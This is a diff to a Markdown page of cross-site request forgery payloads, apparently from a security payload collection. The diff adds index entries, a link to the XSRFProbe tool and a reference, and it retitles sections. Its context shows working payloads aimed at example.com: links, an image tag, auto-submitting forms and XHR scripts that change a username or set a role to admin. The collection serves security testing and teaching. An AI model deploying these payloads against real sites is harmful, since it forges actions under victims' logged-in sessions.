@@ -7,6 +7,17 @@
 
 * [Methodology](#methodology)
 * [Payloads](#payloads)
+    * [HTML GET - Requiring User Interaction](#)
+    * [HTML GET - No User Interaction)](#)
+    * [HTML POST - Requiring User Interaction](#)
+    * [HTML POST - AutoSubmit - No User Interaction](#)
+    * [JSON GET - Simple Request](#)
+    * [JSON POST - Simple Request](#)
+    * [JSON POST - Complex Request](#)
+
+## Tools
+
+* [XSRFProbe - The Prime Cross Site Request Forgery Audit and Exploitation Toolkit.](https://github.com/0xInfection/XSRFProbe)
 
 ## Methodology
 
@@ -16,19 +27,19 @@
 
 When you are logged in to a certain site, you typically have a session. The identifier of that session is stored in a cookie in your browser, and is sent with every request to that site. Even if some other site triggers a request, the cookie is sent along with the request and the request is handled as if the logged in user performed it.
 
-### HTML GET – Requiring User Interaction for Proof-of-Concept
+### HTML GET - Requiring User Interaction
 
 ```html
 <a href="http://www.example.com/api/setusername?username=CSRFd">Click Me</a>
 ```
 
-### HTML GET (No User Interaction)
+### HTML GET - No User Interaction
 
 ```html
 <img src="http://www.example.com/api/setusername?username=CSRFd">
 ```
 
-### HTML POST – Requiring User Interaction for Proof-of-Concept
+### HTML POST - Requiring User Interaction
 
 ```html
 <form action="http://www.example.com/api/setusername" enctype="text/plain" method="POST">
@@ -37,7 +48,7 @@ When you are logged in to a certain site, you typically have a session. The iden
 </form>
 ```
 
-### HTML POST (AutoSubmit – No User Interaction)
+### HTML POST - AutoSubmit - No User Interaction
 
 ```html
 <form id="autosubmit" action="http://www.example.com/api/setusername" enctype="text/plain" method="POST">
@@ -51,7 +62,7 @@ When you are logged in to a certain site, you typically have a session. The iden
 ```
 
 
-### JSON GET – Simple Request
+### JSON GET - Simple Request
 
 ```html
 <script>
@@ -61,7 +72,7 @@ xhr.send();
 </script>
 ```
 
-### JSON POST – Simple Request
+### JSON POST - Simple Request
 
 ```html
 <script>
@@ -76,7 +87,7 @@ xhr.send('{"role":admin}');
 </script>
 ```
 
-### JSON POST – Complex Request
+### JSON POST - Complex Request
 
 ```html
 <script>
@@ -103,3 +114,4 @@ xhr.send('{"role":admin}');
 - [Hacking Facebook accounts using CSRF in Oculus-Facebook integration](https://www.josipfranjkovic.com/blog/hacking-facebook-oculus-integration-csrf)
 - [Cross site request forgery (CSRF) - Sjoerd Langkemper - Jan 9, 2019](http://www.sjoerdlangkemper.nl/2019/01/09/csrf/)
 - [Cross-Site Request Forgery Attack - PwnFunction](https://www.youtube.com/watch?v=eWEgUcHPle0)
+- [Wiping Out CSRF - Joe Rozner - Oct 17, 2017](#https://medium.com/@jrozner/wiping-out-csrf-ded97ae7e83f)
